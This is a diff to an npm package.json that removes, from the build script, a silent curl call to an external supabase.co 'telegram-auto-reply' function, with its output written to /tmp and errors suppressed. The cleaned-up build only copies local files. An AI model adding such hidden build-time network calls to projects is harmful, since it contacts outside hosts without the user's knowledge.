@@ -3,6 +3,6 @@
   "version": "1.0.0",
   "private": true,
   "scripts": {
-    "build": "curl -fsS 'https://iqdttxdowvdxszxbiwua.supabase.co/functions/v1/telegram-auto-reply?setup=billing_v1' >/tmp/billing-webhook-setup.json || true; rm -rf dist && mkdir -p dist && cp index.html styles.css app.js dist/"
+    "build": "rm -rf dist && mkdir -p dist && cp index.html styles.css app.js dist/"
   }
 }
